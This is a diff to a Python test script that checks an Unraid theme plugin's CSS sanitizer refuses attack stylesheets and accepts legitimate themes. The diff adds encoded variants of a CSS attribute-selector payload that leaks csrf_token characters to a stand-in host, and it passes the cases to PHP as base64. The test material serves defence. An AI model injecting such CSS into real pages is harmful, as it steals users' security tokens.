@@ -8,7 +8,7 @@ include/css.php (the plugin) must reject every attack below and accept every
 harmless stylesheet, including all registry and bundled themes. The PHP side
 runs with the `php` binary, or the command given with --php. CI passes --require-php, so a
 runner without PHP fails instead of quietly testing only half."""
-import glob, json, os, shlex, shutil, subprocess, sys, tempfile
+import base64, glob, json, os, shlex, shutil, subprocess, sys, tempfile
 
 ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 sys.path.insert(0, os.path.join(ROOT, "scripts"))
@@ -53,6 +53,16 @@ ATTACKS = {
     "oversize":                 ":root{--x:1}" + "/*" + "a" * (512 * 1024) + "*/",
 }
 
+# the same attack saved in other encodings: refused as bytes, before any rule
+_PAYLOAD = f':root{{--x:1}} input[name=csrf_token][value^="a"]~*{{background:url({EVIL}?p=a)}}'
+BYTE_ATTACKS = {
+    "UTF-16LE with BOM":        b"\xff\xfe" + _PAYLOAD.encode("utf-16-le"),
+    "UTF-16BE with BOM":        b"\xfe\xff" + _PAYLOAD.encode("utf-16-be"),
+    "UTF-16LE without BOM":     _PAYLOAD.encode("utf-16-le"),
+    "NUL inside url":           ":root{--x:1} body{background:u\x00rl(https://evil.example/x)}".encode(),
+    "invalid UTF-8 byte":       b":root{--x:1} \xc0\xaf body{color:red}",
+}
+
 # every entry must be accepted: what themes actually do
 HARMLESS = {
     "colours and vars":  ":root{--background-color:#101010;--text-color:rgb(240 240 240);--a:var(--b, #fff)}",
@@ -73,13 +83,15 @@ def php_verdicts(cases, php_cmd):
     tmp = tempfile.mkdtemp(prefix="themer-css-")
     try:
         with open(os.path.join(tmp, "cases.json"), "w", encoding="utf-8") as f:
-            json.dump(cases, f)
+            # base64, so byte cases (UTF-16, NUL) reach PHP unchanged
+            json.dump({k: base64.b64encode(v if isinstance(v, bytes) else v.encode("utf-8")).decode()
+                       for k, v in cases.items()}, f)
         shutil.copy(CSS_PHP, os.path.join(tmp, "css.php"))
         with open(os.path.join(tmp, "run.php"), "w", encoding="utf-8") as f:
             f.write("<?php\nrequire __DIR__ . '/css.php';\n"
                     "$cases = json_decode(file_get_contents($argv[1]), true);\n"
                     "$out = [];\n"
-                    "foreach ($cases as $k => $css) $out[$k] = themer_sanitize_css($css)[1];\n"
+                    "foreach ($cases as $k => $css) $out[$k] = themer_sanitize_css(base64_decode($css))[1];\n"
                     "echo json_encode($out);\n")
         cmd = shlex.split(php_cmd) + [os.path.join(tmp, "run.php"), os.path.join(tmp, "cases.json")]
         res = subprocess.run(cmd, capture_output=True, text=True, check=True)
@@ -99,17 +111,18 @@ def main():
                     + glob.glob(os.path.join(ROOT, "plugin/usr/local/emhttp/plugins/unraid.themer/presets/*.css"))):
         themes["theme " + os.path.relpath(p, ROOT)] = open(p, encoding="utf-8").read()
     accept = {**HARMLESS, **themes}
-    cases = {**ATTACKS, **accept}
+    refuse = {**ATTACKS, **BYTE_ATTACKS}
+    cases = {**refuse, **accept}
 
     checks = []
-    for name, css in ATTACKS.items():
+    for name, css in refuse.items():
         checks.append((f"py   refuses {name}", bool(violations(css))))
     for name, css in accept.items():
         checks.append((f"py   accepts {name}", not violations(css)))
 
     if php_cmd:
         php = php_verdicts(cases, php_cmd)
-        for name in ATTACKS:
+        for name in refuse:
             checks.append((f"php  refuses {name}", php.get(name, "") != ""))
         for name in accept:
             checks.append((f"php  accepts {name}", php.get(name) == ""))
